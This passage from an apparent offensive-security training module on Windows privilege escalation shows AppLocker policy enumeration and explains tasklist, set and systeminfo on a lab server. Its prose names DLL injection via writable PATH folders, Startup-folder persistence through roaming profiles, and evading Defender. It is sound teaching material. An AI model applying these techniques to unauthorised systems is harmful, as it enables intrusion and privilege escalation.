<span class="hljs-string">QuickScanEndTime                :</span>
<span class="hljs-string">QuickScanStartTime              :</span>
<span class="hljs-string">RealTimeProtectionEnabled       :</span> False
<span class="hljs-string">RealTimeScanDirection           :</span> <span class="hljs-number">0</span>
<span class="hljs-string">PSComputerName                  :</span>
</code></pre>
<p><strong>List AppLocker Rules</strong></p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-AppLockerPolicy -Effective | <span class="hljs-keyword">select</span> -ExpandProperty RuleCollections

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : <span class="hljs-type">a9e18c21</span>-ff8f-<span class="hljs-number">43</span>cf-b9fc-db40eed693ba
Name                : (<span class="hljs-type">Default</span> Rule) <span class="hljs-keyword">All</span> signed packaged apps
Description         : <span class="hljs-type">Allows</span> members <span class="hljs-keyword">of</span> the Everyone group to run packaged apps that are signed.
UserOrGroupSid      : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>
Action              : <span class="hljs-type">Allow</span>

PathConditions      : {%<span class="hljs-type">PROGRAMFILES</span>%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921<span class="hljs-type">cc481</span>-<span class="hljs-number">6e17</span>-<span class="hljs-number">4653</span>-<span class="hljs-number">8</span>f75-<span class="hljs-number">050</span>b80acca20
Name                : (<span class="hljs-type">Default</span> Rule) <span class="hljs-keyword">All</span> files located <span class="hljs-keyword">in</span> the Program Files folder
Description         : <span class="hljs-type">Allows</span> members <span class="hljs-keyword">of</span> the Everyone group to run applications that are located <span class="hljs-keyword">in</span> the Program Files
                      folder.
UserOrGroupSid      : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>
Action              : <span class="hljs-type">Allow</span>

PathConditions      : {%<span class="hljs-type">WINDIR</span>%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : <span class="hljs-type">a61c8b2c</span>-a319-<span class="hljs-number">4</span>cd0-<span class="hljs-number">9690</span>-d2177cad7b51
Name                : (<span class="hljs-type">Default</span> Rule) <span class="hljs-keyword">All</span> files located <span class="hljs-keyword">in</span> the Windows folder
Description         : <span class="hljs-type">Allows</span> members <span class="hljs-keyword">of</span> the Everyone group to run applications that are located <span class="hljs-keyword">in</span> the Windows folder.
UserOrGroupSid      : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>
Action              : <span class="hljs-type">Allow</span>

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : <span class="hljs-type">fd686d83</span>-a829-<span class="hljs-number">4351</span>-<span class="hljs-number">8</span>ff4-<span class="hljs-number">27</span>c7de5755d2
Name                : (<span class="hljs-type">Default</span> Rule) <span class="hljs-keyword">All</span> files
Description         : <span class="hljs-type">Allows</span> members <span class="hljs-keyword">of</span> the local Administrators group to run <span class="hljs-keyword">all</span> applications.
UserOrGroupSid      : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">544</span>
Action              : <span class="hljs-type">Allow</span>

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : <span class="hljs-type">b7af7102</span>-efde-<span class="hljs-number">4369</span>-<span class="hljs-number">8</span>a89-<span class="hljs-number">7</span>a6a392d1473
Name                : (<span class="hljs-type">Default</span> Rule) <span class="hljs-keyword">All</span> digitally signed Windows Installer files
Description         : <span class="hljs-type">Allows</span> members <span class="hljs-keyword">of</span> the Everyone group to run digitally signed Windows Installer files.
UserOrGroupSid      : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>
Action              : <span class="hljs-type">Allow</span>

PathConditions      : {%<span class="hljs-type">WINDIR</span>%\Installer\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 5<span class="hljs-type">b290184</span>-<span class="hljs-number">345</span>a-<span class="hljs-number">4453</span>-b184-<span class="hljs-number">45305</span>f6d9a54
Name                : (<span class="hljs-type">Default</span> Rule) <span class="hljs-keyword">All</span> Windows Installer files <span class="hljs-keyword">in</span> %systemdrive%\Windows\Installer
Description         : <span class="hljs-type">Allows</span> members <span class="hljs-keyword">of</span> the Everyone group to run <span class="hljs-keyword">all</span> Windows Installer files located <span class="hljs-keyword">in</span>
                      %systemdrive%\Windows\Installer.
UserOrGroupSid      : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>
Action              : <span class="hljs-type">Allow</span>

PathConditions      : {*.*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 64<span class="hljs-type">ad46ff</span>-<span class="hljs-number">0</span>d71-<span class="hljs-number">4</span>fa0-a30b-<span class="hljs-number">3</span>f3d30c5433d
Name                : (<span class="hljs-type">Default</span> Rule) <span class="hljs-keyword">All</span> Windows Installer files
Description         : <span class="hljs-type">Allows</span> members <span class="hljs-keyword">of</span> the local Administrators group to run <span class="hljs-keyword">all</span> Windows Installer files.
UserOrGroupSid      : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">544</span>
Action              : <span class="hljs-type">Allow</span>

PathConditions      : {%<span class="hljs-type">PROGRAMFILES</span>%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06<span class="hljs-type">dce67b</span>-<span class="hljs-number">934</span>c-<span class="hljs-number">454</span>f-a263-<span class="hljs-number">2515</span>c8796a5d
Name                : (<span class="hljs-type">Default</span> Rule) <span class="hljs-keyword">All</span> scripts located <span class="hljs-keyword">in</span> the Program Files folder
Description         : <span class="hljs-type">Allows</span> members <span class="hljs-keyword">of</span> the Everyone group to run scripts that are located <span class="hljs-keyword">in</span> the Program Files folder.
UserOrGroupSid      : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>
Action              : <span class="hljs-type">Allow</span>

PathConditions      : {%<span class="hljs-type">WINDIR</span>%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 9428<span class="hljs-type">c672</span>-<span class="hljs-number">5</span>fc3-<span class="hljs-number">47</span>f4-<span class="hljs-number">808</span>a-a0011f36dd2c
Name                : (<span class="hljs-type">Default</span> Rule) <span class="hljs-keyword">All</span> scripts located <span class="hljs-keyword">in</span> the Windows folder
Description         : <span class="hljs-type">Allows</span> members <span class="hljs-keyword">of</span> the Everyone group to run scripts that are located <span class="hljs-keyword">in</span> the Windows folder.
UserOrGroupSid      : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>
Action              : <span class="hljs-type">Allow</span>

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : <span class="hljs-type">ed97d0cb</span>-<span class="hljs-number">15</span>ff-<span class="hljs-number">430</span>f-b82c-<span class="hljs-number">8</span>d7832957725
Name                : (<span class="hljs-type">Default</span> Rule) <span class="hljs-keyword">All</span> scripts
Description         : <span class="hljs-type">Allows</span> members <span class="hljs-keyword">of</span> the local Administrators group to run <span class="hljs-keyword">all</span> scripts.
UserOrGroupSid      : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">544</span>
Action              : <span class="hljs-type">Allow</span>
</code></pre>
<p><strong>Test AppLocker Policy</strong></p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\c</span>md.exe -User Everyone

FilePath                    PolicyDecision MatchingRule
--------                    -------------- ------------
C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\c</span>md.exe         Denied c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe
</code></pre>
<hr>
<h3 id="next-steps">Next Steps</h3>
<p>Now that we have gathered network information about the host and enumerated any protections in place, we can decide which tools or manual techniques to use in the subsequent enumeration phases and any additional possible avenues of attack within the network.</p>
<h2 id="initial-enumeration">Initial Enumeration</h2>
<hr>
<p>During an assessment, we may gain a low-privileged shell on a Windows host (domain-joined or not) and need to perform privilege escalation to further our access. Fully compromising the host may gain us access to sensitive files/file shares, grant us the ability to capture traffic to obtain more credentials, or obtain credentials that can help further our access or even escalate directly to Domain Admin in an Active Directory environment. We can escalate privileges to one of the following depending on the system configuration and what type of data we encounter:</p>
<table>
<thead>
<tr>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>The highly privileged <code>NT AUTHORITY\SYSTEM</code> account, or <a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account">LocalSystem</a> account which is a highly privileged account with more privileges than a local administrator account and is used to run most Windows services.</td>
</tr>
<tr>
<td>The built-in local <code>administrator</code> account. Some organizations disable this account, but many do not. It is not uncommon to see this account reused across multiple systems in a client environment.</td>
</tr>
<tr>
<td>Another local account that is a member of the local <code>Administrators</code> group. Any account in this group will have the same privileges as the built-in <code>administrator</code> account.</td>
</tr>
<tr>
<td>A standard (non-privileged) domain user who is part of the local <code>Administrators</code> group.</td>
</tr>
<tr>
<td>A domain admin (highly privileged in the Active Directory environment) that is part of the local <code>Administrators</code> group.</td>
</tr>
</tbody>
</table>
<p>Enumeration is the key to privilege escalation. When we gain initial shell access to the host, it is vital to gain situational awareness and uncover details relating to the OS version, patch level, installed software, current privileges, group memberships, and more. Let&#39;s walk through some of the key data points that we should be reviewing after gaining initial access. This is not an exhaustive list by any means, and the various enumeration scripts/tools that we covered in the previous section cover all of these data points and many, many more. Nonetheless, it is essential to understand how to perform these tasks manually, especially if we find ourselves in an environment where we cannot load tools due to network restrictions, lack of internet access, or protections in place.</p>
<p>This <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands">Windows commands reference</a> is very handy for performing manual enumeration tasks.</p>
<hr>
<h3 id="key-data-points">Key Data Points</h3>
<p><code>OS name</code>: Knowing the type of Windows OS (workstation or server) and level (Windows 7 or 10, Server 2008, 2012, 2016, 2019, etc.) will give us an idea of the types of tools that may be available (such as the <code>PowerShell</code> version, or lack thereof on legacy systems. This would also identify the operating system version for which there may be public exploits available.</p>
<p><code>Version</code>: As with the OS <a href="https://en.wikipedia.org/wiki/Comparison\_of\_Microsoft\_Windows\_versions">version</a>, there may be public exploits that target a vulnerability in a specific version of Windows. Windows system exploits can cause system instability or even a complete crash. Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.</p>
<p><code>Running Services</code>: Knowing what services are running on the host is important, especially those running as <code>NT AUTHORITY\SYSTEM</code> or an administrator-level account. A misconfigured or vulnerable service running in the context of a privileged account can be an easy win for privilege escalation.</p>
<p>Let&#39;s take a more in-depth look.</p>
<hr>
<h3 id="system-information">System Information</h3>
<p>Looking at the system itself will give us a better idea of the exact operating system version, hardware in use, installed programs, and security updates. This will help us narrow down our hunt for any missing patches and associated CVEs that we may be able to leverage to escalate privileges. Using the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist">tasklist</a> command to look at running processes will give us a better idea of what applications are currently running on the system.</p>
<p><strong>Tasklist</strong></p>
<pre><code class="lang-cmd-session">C:\htb&gt; tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process             <span class="hljs-number"> 0 </span>N/A
System                          <span class="hljs-number"> 4 </span>N/A
smss.exe                      <span class="hljs-number"> 316 </span>N/A
csrss.exe                     <span class="hljs-number"> 424 </span>N/A
wininit.exe                   <span class="hljs-number"> 528 </span>N/A
csrss.exe                     <span class="hljs-number"> 540 </span>N/A
winlogon.exe                  <span class="hljs-number"> 612 </span>N/A
services.exe                  <span class="hljs-number"> 664 </span>N/A
lsass.exe                     <span class="hljs-number"> 672 </span>KeyIso, SamSs, VaultSvc
svchost.exe                   <span class="hljs-number"> 776 </span>BrokerInfrastructure, DcomLaunch, LSM,
                                   PlugPlay, Power, SystemEventsBroker
svchost.exe                   <span class="hljs-number"> 836 </span>RpcEptMapper, RpcSs
LogonUI.exe                   <span class="hljs-number"> 952 </span>N/A
dwm.exe                       <span class="hljs-number"> 964 </span>N/A
svchost.exe                   <span class="hljs-number"> 972 </span>TermService
svchost.exe                  <span class="hljs-number"> 1008 </span>Dhcp, EventLog, lmhosts, TimeBrokerSvc
svchost.exe                   <span class="hljs-number"> 364 </span>NcbService, PcaSvc, ScDeviceEnum, TrkWks,
                                   UALSVC, UmRdpService
&lt;...SNIP...&gt;

svchost.exe                  <span class="hljs-number"> 1468 </span>Wcmsvc
svchost.exe                  <span class="hljs-number"> 1804 </span>PolicyAgent
spoolsv.exe                  <span class="hljs-number"> 1884 </span>Spooler
svchost.exe                  <span class="hljs-number"> 1988 </span>W3SVC, WAS
svchost.exe                  <span class="hljs-number"> 1996 </span>ftpsvc
svchost.exe                  <span class="hljs-number"> 2004 </span>AppHostSvc
FileZilla Server.exe         <span class="hljs-number"> 1140 </span>FileZilla Server
inetinfo.exe                 <span class="hljs-number"> 1164 </span>IISADMIN
svchost.exe                  <span class="hljs-number"> 1736 </span>DiagTrack
svchost.exe                  <span class="hljs-number"> 2084 </span>StateRepository, tiledatamodelsvc
VGAuthService.exe            <span class="hljs-number"> 2100 </span>VGAuthService
vmtoolsd.exe                 <span class="hljs-number"> 2112 </span>VMTools
MsMpEng.exe                  <span class="hljs-number"> 2136 </span>WinDefend

&lt;...SNIP...&gt;

FileZilla Server Interfac    <span class="hljs-number"> 5628 </span>N/A
jusched.exe                  <span class="hljs-number"> 5796 </span>N/A
cmd.exe                      <span class="hljs-number"> 4132 </span>N/A
conhost.exe                  <span class="hljs-number"> 4136 </span>N/A
TrustedInstaller.exe         <span class="hljs-number"> 1120 </span>TrustedInstaller
TiWorker.exe                 <span class="hljs-number"> 1816 </span>N/A
WmiApSrv.exe                 <span class="hljs-number"> 2428 </span>wmiApSrv
tasklist.exe                 <span class="hljs-number"> 3596 </span>N/A
</code></pre>
<p>It is essential to become familiar with standard Windows processes such as <a href="https://en.wikipedia.org/wiki/Session\_Manager\_Subsystem">Session Manager Subsystem (smss.exe)</a>, <a href="https://en.wikipedia.org/wiki/Client/Server\_Runtime\_Subsystem">Client Server Runtime Subsystem (csrss.exe)</a>, <a href="https://en.wikipedia.org/wiki/Winlogon">WinLogon (winlogon.exe)</a>, <a href="https://en.wikipedia.org/wiki/Local\_Security\_Authority\_Subsystem\_Service">Local Security Authority Subsystem Service (LSASS)</a>, and <a href="https://en.wikipedia.org/wiki/Svchost.exe">Service Host (svchost.exe)</a>, among others and the services associated with them. Being able to spot standard processes/services quickly will help speed up our enumeration and enable us to hone in on non-standard processes/services, which may open up a privilege escalation path. In the example above, we would be most interested in the <code>FileZilla</code> FTP server running and would attempt to enumerate the version to look for public vulnerabilities or misconfigurations such as FTP anonymous access, which could lead to sensitive data exposure or more.</p>
<p>Other processes such as <code>MsMpEng.exe</code>, Windows Defender, are interesting because they can help us map out what protections are in place on the target host that we may have to evade/bypass.</p>
<p><strong>Display All Environment Variables</strong></p>
<p>The environment variables explain a lot about the host configuration. To get a printout of them, Windows provides the <code>set</code> command. One of the most overlooked variables is <code>PATH</code>. In the output below, nothing is out of the ordinary. However, it is not uncommon to find administrators (or applications) modify the <code>PATH</code>. One common example is to place Python or Java in the path, which would allow the execution of Python or . JAR files. If the folder placed in the PATH is writable by your user, it may be possible to perform DLL Injections against other applications. Remember, when running a program, Windows looks for that program in the CWD (Current Working Directory) first, then from the PATH going left to right. This means if the custom path is placed on the left (before C:\Windows\System32), it is much more dangerous than on the right.</p>
<p>In addition to the PATH, <code>set</code> can also give up other helpful information such as the HOME DRIVE. In enterprises, this will often be a file share. Navigating to the file share itself may reveal other directories that can be accessed. It is not unheard of to be able to access an &quot;IT Directory,&quot; which contains an inventory spreadsheet that includes passwords. Additionally, shares are utilized for home directories so the user can log on to other computers and have the same experience/files/desktop/etc. (<a href="https://docs.microsoft.com/en-us/windows-server/storage/folder-redirection/folder-redirection-rup-overview">Roaming Profiles</a>). This may also mean the user takes malicious items with them. If a file is placed in <code>USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup</code>, when the user logs into a different machine, this file will execute.</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-tag">\<span class="hljs-name">htb</span></span>&gt; set

ALLUSERSPROFILE=C:<span class="hljs-tag">\<span class="hljs-name">ProgramData</span></span>
APPDATA=C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">Administrator</span></span><span class="hljs-tag">\<span class="hljs-name">AppData</span></span><span class="hljs-tag">\<span class="hljs-name">Roaming</span></span>
CommonProgramFiles=C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Common</span></span> Files
CommonProgramFiles(x86)=C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files (x86)<span class="hljs-tag">\<span class="hljs-name">Common</span></span> Files
CommonProgramW6432=C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Common</span></span> Files
COMPUTERNAME=WINLPE-SRV01
ComSpec=C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">system</span></span>32<span class="hljs-tag">\<span class="hljs-name">cmd</span></span>.exe
HOMEDRIVE=C:
HOMEPATH=<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">Administrator</span></span>
LOCALAPPDATA=C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">Administrator</span></span><span class="hljs-tag">\<span class="hljs-name">AppData</span></span><span class="hljs-tag">\<span class="hljs-name">Local</span></span>
LOGONSERVER=<span class="hljs-tag">\<span class="hljs-name">\</span></span>WINLPE-SRV01
NUMBER_OF_PROCESSORS=6
OS=Windows_NT
Path=C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">system</span></span>32;C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span>;C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">System</span></span>32<span class="hljs-tag">\<span class="hljs-name">Wbem</span></span>;C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">System</span></span>32<span class="hljs-tag">\<span class="hljs-name">WindowsPowerShell</span></span><span class="hljs-tag">\<span class="hljs-name">v</span></span>1.0<span class="hljs-tag">\<span class="hljs-name">;</span></span>C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">Administrator</span></span><span class="hljs-tag">\<span class="hljs-name">AppData</span></span><span class="hljs-tag">\<span class="hljs-name">Local</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">WindowsApps</span></span>;
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
PROCESSOR_LEVEL=23
PROCESSOR_REVISION=3100
ProgramData=C:<span class="hljs-tag">\<span class="hljs-name">ProgramData</span></span>
ProgramFiles=C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files
ProgramFiles(x86)=C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files (x86)
ProgramW6432=C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files
PROMPT=<span class="hljs-formula">$P$</span>G
PSModulePath=C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">WindowsPowerShell</span></span><span class="hljs-tag">\<span class="hljs-name">Modules</span></span>;C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">system</span></span>32<span class="hljs-tag">\<span class="hljs-name">WindowsPowerShell</span></span><span class="hljs-tag">\<span class="hljs-name">v</span></span>1.0<span class="hljs-tag">\<span class="hljs-name">Modules</span></span>
PUBLIC=C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">Public</span></span>
SESSIONNAME=Console
SystemDrive=C:
SystemRoot=C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span>
TEMP=C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">ADMINI</span></span>~1<span class="hljs-tag">\<span class="hljs-name">AppData</span></span><span class="hljs-tag">\<span class="hljs-name">Local</span></span><span class="hljs-tag">\<span class="hljs-name">Temp</span></span><span class="hljs-tag">\</span>1
TMP=C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">ADMINI</span></span>~1<span class="hljs-tag">\<span class="hljs-name">AppData</span></span><span class="hljs-tag">\<span class="hljs-name">Local</span></span><span class="hljs-tag">\<span class="hljs-name">Temp</span></span><span class="hljs-tag">\</span>1
USERDOMAIN=WINLPE-SRV01
USERDOMAIN_ROAMINGPROFILE=WINLPE-SRV01
USERNAME=Administrator
USERPROFILE=C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">Administrator</span></span>
windir=C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span>
</code></pre>
<p><strong>View Detailed Configuration Information</strong></p>
<p>The <code>systeminfo</code> command will show if the box has been patched recently and if it is a VM. If the box has not been patched recently, getting administrator-level access may be as simple as running a known exploit. Google the KBs installed under <a href="https://www.catalog.update.microsoft.com/Search.aspx?q=hotfix">HotFixes</a> to get an idea of when the box has been patched. This information isn&#39;t always present, as it is possible to hide hotfixes software from non-administrators. The <code>System Boot Time</code> and <code>OS Version</code> can also be checked to get an idea of the patch level. If the box has not been restarted in over six months, chances are it is also not being patched.</p>
<p>Additionally, many guides will say the Network Information is important as it could indicate a dual-homed machine (connected to multiple networks). Generally speaking, when it comes to enterprises, devices will just be granted access to other networks via a firewall rule and not have a physical cable run to them.</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\htb&gt; systeminfo

Host <span class="hljs-attribute">Name</span>:                 WINLPE-SRV01
OS <span class="hljs-attribute">Name</span>:                   Microsoft Windows Server <span class="hljs-number">2016</span> Standard
OS <span class="hljs-attribute">Version</span>:                <span class="hljs-number">10.0</span>.<span class="hljs-number">14393</span> N/A Build <span class="hljs-number">14393</span>
OS <span class="hljs-attribute">Manufacturer</span>:           Microsoft Corporation
OS <span class="hljs-attribute">Configuration</span>:          Standalone Server
OS Build <span class="hljs-attribute">Type</span>:             Multiprocessor Free
Registered <span class="hljs-attribute">Owner</span>:          Windows User
Registered <span class="hljs-attribute">Organization</span>:
Product <span class="hljs-attribute">ID</span>:                <span class="hljs-number">00376</span>-<span class="hljs-number">30000</span>-<span class="hljs-number">00299</span>-AA303
Original Install <span class="hljs-attribute">Date</span>:     <span class="hljs-number">3</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2021</span>, <span class="hljs-number">3</span>:<span class="hljs-number">46</span>:<span class="hljs-number">32</span> PM
System Boot <span class="hljs-attribute">Time</span>:          <span class="hljs-number">3</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2021</span>, <span class="hljs-number">9</span>:<span class="hljs-number">24</span>:<span class="hljs-number">36</span> AM
System <span class="hljs-attribute">Manufacturer</span>:       VMware, Inc.
System <span class="hljs-attribute">Model</span>:              VMware7,<span class="hljs-number">1</span>
System <span class="hljs-attribute">Type</span>:               x64-based PC
Processor(s):              <span class="hljs-number">3</span> Processor(s) Installed.
                           [<span class="hljs-number">01</span>]: AMD64 Family <span class="hljs-number">23</span> Model <span class="hljs-number">49</span> Stepping <span class="hljs-number">0</span> AuthenticAMD ~<span class="hljs-number">2994</span> Mhz
                           [<span class="hljs-number">02</span>]: AMD64 Family <span class="hljs-number">23</span> Model <span class="hljs-number">49</span> Stepping <span class="hljs-number">0</span> AuthenticAMD ~<span class="hljs-number">2994</span> Mhz
                           [<span class="hljs-number">03</span>]: AMD64 Family <span class="hljs-number">23</span> Model <span class="hljs-number">49</span> Stepping <span class="hljs-number">0</span> AuthenticAMD ~<span class="hljs-number">2994</span> Mhz
BIOS <span class="hljs-attribute">Version</span>:              VMware, Inc. VMW71.<span class="hljs-number">00</span>V.<span class="hljs-number">16707776</span>.B64.<span class="hljs-number">2008070230</span>, <span class="hljs-number">8</span>/<span class="hljs-number">7</span>/<span class="hljs-number">2020</span>
Windows <span class="hljs-attribute">Directory</span>:         <span class="hljs-attribute">C</span>:\Windows
System <span class="hljs-attribute">Directory</span>:          <span class="hljs-attribute">C</span>:\Windows\system32
Boot <span class="hljs-attribute">Device</span>:               \Device\HarddiskVolume2
System <span class="hljs-attribute">Locale</span>:             en-us;<span class="hljs-selector-tag">English</span> (United States)
<span class="hljs-selector-tag">Input</span> <span class="hljs-selector-tag">Locale</span>:              <span class="hljs-selector-tag">en-us</span>;<span class="hljs-selector-tag">English</span> (United States)
<span class="hljs-selector-tag">Time</span> <span class="hljs-selector-tag">Zone</span>:                 (<span class="hljs-attribute">UTC-08</span>:<span class="hljs-number">00</span>) <span class="hljs-selector-tag">Pacific</span> <span class="hljs-selector-tag">Time</span> (US &amp; Canada)
<span class="hljs-selector-tag">Total</span> <span class="hljs-selector-tag">Physical</span> <span class="hljs-selector-tag">Memory</span>:     <span class="hljs-selector-tag">6</span>,<span class="hljs-selector-tag">143</span> <span class="hljs-selector-tag">MB</span>
<span class="hljs-selector-tag">Available</span> <span class="hljs-selector-tag">Physical</span> <span class="hljs-selector-tag">Memory</span>: <span class="hljs-selector-tag">3</span>,<span class="hljs-selector-tag">474</span> <span class="hljs-selector-tag">MB</span>
<span class="hljs-selector-tag">Virtual</span> <span class="hljs-selector-tag">Memory</span>: <span class="hljs-selector-tag">Max</span> <span class="hljs-selector-tag">Size</span>:  <span class="hljs-selector-tag">10</span>,<span class="hljs-selector-tag">371</span> <span class="hljs-selector-tag">MB</span>
<span class="hljs-selector-tag">Virtual</span> <span class="hljs-selector-tag">Memory</span>: <span class="hljs-selector-tag">Available</span>: <span class="hljs-selector-tag">7</span>,<span class="hljs-selector-tag">544</span> <span class="hljs-selector-tag">MB</span>
<span class="hljs-selector-tag">Virtual</span> <span class="hljs-selector-tag">Memory</span>: <span class="hljs-selector-tag">In</span> <span class="hljs-selector-tag">Use</span>:    <span class="hljs-selector-tag">2</span>,<span class="hljs-selector-tag">827</span> <span class="hljs-selector-tag">MB</span>
<span class="hljs-selector-tag">Page</span> <span class="hljs-selector-tag">File</span> <span class="hljs-selector-tag">Location</span>(s):     <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">pagefile</span><span class="hljs-selector-class">.sys</span>
<span class="hljs-selector-tag">Domain</span>:                    <span class="hljs-selector-tag">WORKGROUP</span>
<span class="hljs-selector-tag">Logon</span> <span class="hljs-selector-tag">Server</span>:              \\<span class="hljs-selector-tag">WINLPE-SRV01</span>
<span class="hljs-selector-tag">Hotfix</span>(s):                 <span class="hljs-selector-tag">3</span> <span class="hljs-selector-tag">Hotfix</span>(s) <span class="hljs-selector-tag">Installed</span>.
                           <span class="hljs-selector-attr">[01]</span>: <span class="hljs-selector-tag">KB3199986</span>
                           <span class="hljs-selector-attr">[02]</span>: <span class="hljs-selector-tag">KB5001078</span>
                           <span class="hljs-selector-attr">[03]</span>: <span class="hljs-selector-tag">KB4103723</span>
<span class="hljs-selector-tag">Network</span> <span class="hljs-selector-tag">Card</span>(s):           <span class="hljs-selector-tag">2</span> <span class="hljs-selector-tag">NIC</span>(s) <span class="hljs-selector-tag">Installed</span>.
                           <span class="hljs-selector-attr">[01]</span>: <span class="hljs-selector-tag">Intel</span>(R) <span class="hljs-selector-tag">82574L</span> <span class="hljs-selector-tag">Gigabit</span> <span class="hljs-selector-tag">Network</span> <span class="hljs-selector-tag">Connection</span>
                                 <span class="hljs-selector-tag">Connection</span> <span class="hljs-selector-tag">Name</span>: <span class="hljs-selector-tag">Ethernet0</span>
                                 <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Enabled</span>:    <span class="hljs-selector-tag">Yes</span>
                                 <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Server</span>:     <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>
                                 <span class="hljs-selector-tag">IP</span> <span class="hljs-selector-tag">address</span>(es)
                                 <span class="hljs-selector-attr">[01]</span>: <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.8</span>
                                 <span class="hljs-selector-attr">[02]</span>: <span class="hljs-selector-tag">fe80</span><span class="hljs-selector-pseudo">::e4db</span><span class="hljs-selector-pseudo">:5ea3</span><span class="hljs-selector-pseudo">:2775</span><span class="hljs-selector-pseudo">:8d4d</span>
